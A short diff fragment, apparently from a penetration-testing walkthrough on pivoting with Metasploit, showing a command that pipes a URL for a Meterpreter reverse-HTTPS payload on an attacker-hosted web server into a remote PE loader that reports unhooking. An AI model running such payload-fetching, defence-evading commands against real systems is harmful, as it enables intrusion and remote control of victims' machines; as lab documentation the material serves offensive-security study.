@@ -699,7 +699,7 @@ jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ python3 -m http.server 8080
 Microsoft Windows [Version 10.0.19044.2364]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Users\Administrator\Documents\Tools-AD> RemotePEv1.exe
+C:\Users\Administrator.PO718687\Documents\Tools-AD>echo  http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe | RemotePEv1.exe
 
 [+] Unhooking
 
